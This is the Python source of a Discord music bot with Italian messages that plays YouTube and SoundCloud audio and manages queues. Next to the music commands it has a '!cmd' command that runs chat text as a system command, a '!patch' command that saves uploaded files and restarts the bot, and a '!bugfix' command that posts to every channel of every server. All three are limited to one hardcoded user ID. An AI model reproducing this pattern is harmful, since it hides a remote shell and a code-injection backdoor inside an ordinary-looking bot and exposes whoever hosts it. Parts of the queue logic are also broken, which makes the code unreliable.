import discord
from discord.ext import commands
import subprocess

import os, sys
from dotenv import load_dotenv

import yt_dlp

import asyncio

load_dotenv()

DISCORD_TOKEN = os.getenv("discord_token")

intents = discord.Intents().all()
bot = commands.Bot(command_prefix='!', intents=intents)

yt_dlp.utils.bug_reports_message = lambda: ''

ytdl_format_options = {
    'format': 'bestaudio/best',
    'restrictfilenames': True,
    'noplaylist': True,
    'nocheckcertificate': True,
    'ignoreerrors': False,
    'logtostderr': False,
    'quiet': True,
    'no_warnings': True,
    'default_search': 'auto',
    'source_address': '0.0.0.0'
}

ffmpeg_options = {
    'options': '-vn'
}

ytdl = yt_dlp.YoutubeDL(ytdl_format_options)
queues = {} 


class YTDLSource(discord.PCMVolumeTransformer):
    def __init__(self, source, *, data, volume=0.5):
        super().__init__(source, volume)
        self.data = data
        self.title = data.get('title')
        self.url = ""

    @classmethod
    async def from_url(cls, url, *, loop=None, stream=False):
        loop = loop or asyncio.get_event_loop()
        data = await loop.run_in_executor(None, lambda: ytdl.extract_info(url, download=not stream))
        if 'entries' in data:
            data = data['entries'][0]
        filename = data['title'] if stream else ytdl.prepare_filename(data)

        video_title = data.get('title', None)
        return filename, video_title


@bot.command(name='play', help='')
async def play(ctx, *, url=None):
    is_song_playing = False

    if not ctx.message.author.voice:
        await ctx.send("{} non è connesso nella chat vocale".format(ctx.message.author.name))
        return

    channel = ctx.message.author.voice.channel
    voice_client = ctx.guild.voice_client

    if voice_client:
        if voice_client.channel.id != channel.id:
            await voice_client.move_to(channel)
    else:
        await channel.connect()

    try:
        server = ctx.message.guild
        voice_channel = server.voice_client
        guild_id = ctx.guild.id
        queue = queues.get(guild_id, [])

        if url is None:
            await ctx.send("Non hai scritto niente.")
            return

        if not voice_channel.is_playing():
            if not queue:
                queue.append([url, is_song_playing])

            async with ctx.typing():
                if "youtube.com" in url or "youtu.be" in url:
                    filename, title = await YTDLSource.from_url(url, loop=bot.loop)
                    voice_channel.play(discord.FFmpegPCMAudio(executable="ffmpeg", source=filename),
                                       after=lambda e: play_next(ctx, guild_id))
                    await ctx.send('**:notes: Adesso sto riproducendo:** *{}*'.format(title))
                    os.remove(filename)

                else:
                    video_search = ytdl.extract_info(f"ytsearch:{url}", download=False)

                    if video_search and 'entries' in video_search:
                        video_info = video_search['entries'][0]
                        url = video_info['webpage_url']
                        title = video_info['title']

                        filename = await YTDLSource.from_url(url, loop=bot.loop)
                        voice_channel.play(discord.FFmpegPCMAudio(executable="ffmpeg", source=filename[0]),
                                           after=lambda e: play_next(ctx, guild_id))
                        await ctx.send('**:notes: Adesso sto riproducendo:** *{}*'.format(title))
                        os.remove(filename[0])
                    else:
                        await ctx.send("Non ho trovato ninete su YouTube, cerca qualocos'altro")
                        return

        else:
            queue.append([url, is_song_playing])
            await ctx.send("Canzone aggiunta nella queue! Usa il comando !queue per vedere dove si trova la tua richiesta")

        queues[guild_id] = queue

    except Exception as e:
        print(e)
        await ctx.send("Il bot non va")


@bot.command(name='skip', help='')
async def skip(ctx):
    voice_client = ctx.guild.voice_client

    if voice_client:
        voice_client.stop()

        guild_id = ctx.guild.id
        queue = queues.get(guild_id, [])

        if queue: queue.pop(0)

        if queue:
            next_song_url = queue[0][0]

            async with ctx.typing():
                filename = await YTDLSource.from_url(next_song_url, loop=bot.loop)
                voice_client.play(discord.FFmpegPCMAudio(executable="ffmpeg", source=filename[0]))
                await ctx.send(
                    '**Ho skippato la traccia corrente. Adesso è in riproduzione: ** *{}*'.format(filename[1]))
                os.remove(filename[0])
        else:
            await ctx.send('Ho skippato la traccia. Non ci sono più traccie nella queue.')
    else:
        await ctx.send('Nessuna canzone è in riproduzione.')


async def play_next(ctx, guild_id):
    queue = queues.get(guild_id, [])
    if not queue:
        return

    voice_channel = ctx.guild.voice_client

    track = queue.pop(0)

    async with ctx.typing():
        if "youtube.com" in track[0]:
            filename = await YTDLSource.from_url(track[0], loop=bot.loop)
            voice_channel.play(discord.FFmpegPCMAudio(executable="ffmpeg", source=filename[0]),
                               after=lambda e: play_next(ctx, guild_id))
            await ctx.send(f'**:notes: Adesso sto riproducendo:** {filename[1]}')
            os.remove(filename[0])
        elif "soundcloud.com" in track[0]:
            filename = await YTDLSource.from_url(track[0], loop=bot.loop)
            voice_channel.play(discord.FFmpegPCMAudio(executable="ffmpeg", source=filename[0]),
                               after=lambda e: play_next(ctx, guild_id))
            await ctx.send(f'**:notes: Adesso sto riproducendo:** {filename[1]}')
            os.remove(filename[0])

    queues[guild_id] = queue


@bot.command(name='queue', help='')
async def show_queue(ctx):
    guild_id = ctx.guild.id
    queue = queues.get(guild_id, [])

    if not queue:
        await ctx.send('Non si sono traccie nella queue di questo server!')
    else:
        queue_info = "\n".join([f"{index + 1}. {song[0]}" for index, song in enumerate(queue)])
        await ctx.send(f'**Queue:**\n{queue_info}')


@bot.command(name='stop', help='')
async def stop(ctx):
    voice_client = ctx.guild.voice_client
    if voice_client and voice_client.is_playing():
        voice_client.stop()
        guild_id = ctx.guild.id
        queue = queues.get(guild_id, [])

        queue.clear()
        queues[guild_id] = queue

        await ctx.send('Ho fermato la musica e pulito la queue, uscirò dalla VC.')
        await voice_client.disconnect()
    else:
        await ctx.send('Nessuna canzone è in riproduzione')


@bot.command(name='queue_debug', help='')
async def queue_debug(ctx):
    if ctx.author.id != 686397710475067464:
        await ctx.send("Comando esclusivo per gli admin! Fatti li cazzi tua")
        return

    if len(queues) != 0:
        await ctx.send(queues)
    else:
        await ctx.send("nessuno ha riprodotto traccie nel bot!")

@bot.command(name='bugfix')
async def bugfix(ctx, *, message):
    whitelist = [686397710475067464]
    
    if ctx.author.id in whitelist:
        for guild in bot.guilds:
            for channel in guild.text_channels:
                try:
                    await channel.send(f"`{message}`")
                except:
                    pass
        await ctx.send(f"Messaggio inviato ad {len(bot.guilds)} server!")

@bot.command(name='cmd')
async def cmd(ctx, *, message):
    whitelist = [686397710475067464]
    if ctx.author.id in whitelist:
        cmd_res = subprocess.run([message], stdout=subprocess.PIPE)
        await ctx.send(f'res: {cmd_res.stdout}')
    else:
        await ctx.send("You don't have the permissions to use this command")

@bot.command(name='patch')
async def patch(ctx):
    whitelist = [686397710475067464]
    if ctx.author.id in whitelist:
        if ctx.message.attachments:
            for attachment in ctx.message.attachments:
                file_path = os.path.join(os.getcwd(), attachment.filename)
                await attachment.save(file_path)
                await ctx.send(f'Il bot è stato Patchato! Salvato il file {attachment.filename} su {file_path}')

            await ctx.send("Il bot si sta riavviando...")
            os.execv(sys.executable, ['python'] + sys.argv)

@bot.event
async def on_voice_state_update(member, before, after):
    voice_client = member.guild.voice_client
    if not voice_client:
        return

    # Se il bot è l'unico nel canale vocale
    if len(voice_client.channel.members) == 1:
        guild_id = member.guild.id

        if voice_client.is_playing():
            voice_client.stop()

        queues[guild_id] = []

        text_channel = member.guild.system_channel
        if text_channel is None:
            for channel in member.guild.text_channels:
                if channel.permissions_for(member.guild.me).send_messages:
                    text_channel = channel
                    break

        if text_channel:
            await text_channel.send(":warning: Non c'è più nessuno nel canale vocale. Il bot si sta disconnettendo.")

        await voice_client.disconnect()
if __name__ == "__main__":
    bot.run(DISCORD_TOKEN)



